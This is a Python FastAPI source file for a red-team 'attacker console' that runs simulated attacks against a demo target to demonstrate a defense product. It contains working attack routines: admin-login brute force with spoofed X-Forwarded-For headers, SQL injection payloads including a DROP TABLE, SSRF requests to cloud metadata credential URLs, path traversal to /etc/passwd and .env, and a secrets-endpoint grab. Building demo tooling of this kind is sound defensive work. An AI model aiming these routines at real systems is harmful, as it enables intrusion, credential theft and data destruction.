import os
import sys
import time
import uuid
import pathlib
from typing import Optional, Dict, Any, List
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import httpx

app = FastAPI(
    title="GASHA Red-Team Attacker Console",
    description="Tactical Adversary Simulation Platform for live cyber defense demonstration",
    version="1.0.0"
)

TARGET_BASE = os.getenv("TARGET_URL", "http://localhost:3101")

class AttackConfig(BaseModel):
    attackerIp: str = "198.51.100.101"
    targetUrl: str = os.getenv("TARGET_URL", "http://localhost:3101")
    count: int = 5
    delayMs: int = 50

@app.get("/", response_class=HTMLResponse)
async def serve_console():
    template_path = pathlib.Path(__file__).resolve().parent / "templates" / "index.html"
    return HTMLResponse(content=template_path.read_text(encoding="utf-8"))

@app.get("/api/attack/status")
async def get_attacker_status(ip: str = "198.51.100.101"):
    """Checks whether the specified attacker IP is currently blocked by GASHA."""
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            res = await client.get(f"{TARGET_BASE}/api/demo/security-state")
            if res.status_code == 200:
                data = res.json()
                blocked_ips = data.get("blockedIps", [])
                is_blocked = ip in blocked_ips or "127.0.0.1" in blocked_ips
                return {
                    "attackerIp": ip,
                    "isQuarantined": is_blocked,
                    "allBlockedIps": blocked_ips,
                    "allDisabledSessions": data.get("disabledSessions", [])
                }
    except Exception as e:
        return {"error": str(e), "isQuarantined": False}
    return {"isQuarantined": False}

@app.post("/api/attack/brute-force")
async def attack_brute_force(cfg: AttackConfig):
    """Executes credential stuffing brute-force attack (MITRE T1110)."""
    logs = []
    headers = {"X-Forwarded-For": cfg.attackerIp, "Content-Type": "application/json"}
    
    async with httpx.AsyncClient(base_url=cfg.targetUrl, timeout=5.0) as client:
        for i in range(1, cfg.count + 1):
            t0 = time.time()
            payload = {"username": "admin", "password": f"Password_Attempt_{i}!"}
            try:
                res = await client.post("/api/auth/login", json=payload, headers=headers)
                elapsed_ms = round((time.time() - t0) * 1000, 1)
                data = res.json() if res.headers.get("content-type", "").startswith("application/json") else {}
                
                is_blocked = res.status_code == 403 or "BLOCKED" in str(data)
                logs.append({
                    "step": i,
                    "action": "POST /api/auth/login",
                    "user": "admin",
                    "status": res.status_code,
                    "latencyMs": elapsed_ms,
                    "isBlocked": is_blocked,
                    "response": data
                })
                if is_blocked:
                    break
            except Exception as e:
                logs.append({"step": i, "error": str(e)})
            if cfg.delayMs > 0:
                time.sleep(cfg.delayMs / 1000.0)
                
    return {
        "exploit": "Credential Stuffing / Password Brute-Force",
        "technique": "MITRE ATT&CK T1110",
        "attackerIp": cfg.attackerIp,
        "attemptsCount": len(logs),
        "quarantined": any(l.get("isBlocked") for l in logs),
        "logs": logs
    }

@app.post("/api/attack/sqli")
async def attack_sqli(cfg: AttackConfig):
    """Executes SQL injection probe against search pipeline (MITRE T1190)."""
    headers = {"X-Forwarded-For": cfg.attackerIp}
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT 1,2,username,password FROM users --",
        "admin'--",
        "'; DROP TABLE accounts;--"
    ]
    logs = []
    
    async with httpx.AsyncClient(base_url=cfg.targetUrl, timeout=5.0) as client:
        for idx, p in enumerate(payloads, 1):
            t0 = time.time()
            try:
                res = await client.get(f"/api/customers/lookup?query={p}", headers=headers)
                elapsed_ms = round((time.time() - t0) * 1000, 1)
                data = res.json() if res.headers.get("content-type", "").startswith("application/json") else {}
                is_blocked = res.status_code == 403
                logs.append({
                    "step": idx,
                    "action": f"GET /api/customers/lookup?query={p}",
                    "payload": p,
                    "status": res.status_code,
                    "latencyMs": elapsed_ms,
                    "isBlocked": is_blocked,
                    "detectedPattern": data.get("detectedPattern"),
                    "response": data
                })
                if is_blocked:
                    break
            except Exception as e:
                logs.append({"step": idx, "error": str(e)})
            time.sleep(0.05)
            
    return {
        "exploit": "SQL Injection Database Probe",
        "technique": "MITRE ATT&CK T1190",
        "attackerIp": cfg.attackerIp,
        "logs": logs
    }

@app.post("/api/attack/ssrf")
async def attack_ssrf(cfg: AttackConfig):
    """Executes Server-Side Request Forgery against cloud metadata service (MITRE T1071/T1552)."""
    headers = {"X-Forwarded-For": cfg.attackerIp}
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/identity-credentials/",
        "http://127.0.0.1:4000/api/v1/twin",
        "http://internal-database:5432"
    ]
    logs = []
    
    async with httpx.AsyncClient(base_url=cfg.targetUrl, timeout=5.0) as client:
        for idx, target in enumerate(ssrf_targets, 1):
            t0 = time.time()
            try:
                res = await client.get(f"/api/integrations/fetch-url?url={target}", headers=headers)
                elapsed_ms = round((time.time() - t0) * 1000, 1)
                data = res.json() if res.headers.get("content-type", "").startswith("application/json") else {}
                is_blocked = res.status_code == 403
                logs.append({
                    "step": idx,
                    "action": f"SSRF Inbound Request -> {target}",
                    "targetUrl": target,
                    "status": res.status_code,
                    "latencyMs": elapsed_ms,
                    "isBlocked": is_blocked,
                    "detectedPattern": data.get("detectedPattern"),
                    "response": data
                })
                if is_blocked:
                    break
            except Exception as e:
                logs.append({"step": idx, "error": str(e)})
            time.sleep(0.05)
            
    return {
        "exploit": "Server-Side Request Forgery (SSRF) Cloud Metadata Pivot",
        "technique": "MITRE ATT&CK T1071 / T1552",
        "attackerIp": cfg.attackerIp,
        "logs": logs
    }

@app.post("/api/attack/traversal")
async def attack_traversal(cfg: AttackConfig):
    """Executes Path Traversal & LFI file extraction (MITRE T1083)."""
    headers = {"X-Forwarded-For": cfg.attackerIp}
    traversal_payloads = [
        "../../../../etc/passwd",
        "../../../../.env",
        "..\\..\\..\\win.ini"
    ]
    logs = []
    
    async with httpx.AsyncClient(base_url=cfg.targetUrl, timeout=5.0) as client:
        for idx, p in enumerate(traversal_payloads, 1):
            t0 = time.time()
            try:
                res = await client.get(f"/api/customers/lookup?query={p}", headers=headers)
                elapsed_ms = round((time.time() - t0) * 1000, 1)
                data = res.json() if res.headers.get("content-type", "").startswith("application/json") else {}
                logs.append({
                    "step": idx,
                    "action": f"GET /api/customers/lookup?query={p}",
                    "status": res.status_code,
                    "latencyMs": elapsed_ms,
                    "isBlocked": res.status_code == 403,
                    "detectedPattern": data.get("detectedPattern"),
                    "response": data
                })
            except Exception as e:
                logs.append({"step": idx, "error": str(e)})
                
    return {
        "exploit": "Path Traversal & Arbitrary File Access",
        "technique": "MITRE ATT&CK T1083",
        "attackerIp": cfg.attackerIp,
        "logs": logs
    }

@app.post("/api/attack/secrets")
async def attack_secrets(cfg: AttackConfig):
    """Executes unauthorized exfiltration attempt on Crown Jewel secrets."""
    headers = {"X-Forwarded-For": cfg.attackerIp}
    t0 = time.time()
    
    async with httpx.AsyncClient(base_url=cfg.targetUrl, timeout=5.0) as client:
        res = await client.get("/api/admin/secrets", headers=headers)
        elapsed_ms = round((time.time() - t0) * 1000, 1)
        data = res.json() if res.headers.get("content-type", "").startswith("application/json") else {}
        
    return {
        "exploit": "Crown Jewel Database Key Exfiltration",
        "technique": "MITRE ATT&CK T1078 / T1552",
        "status": res.status_code,
        "latencyMs": elapsed_ms,
        "isBlocked": res.status_code == 403,
        "response": data
    }

@app.post("/api/attack/reset")
async def reset_defense():
    """Resets quarantine blocklists on demo-target."""
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            res = await client.post(f"{TARGET_BASE}/api/demo/reset")
            return res.json()
    except Exception as e:
        return {"error": str(e)}
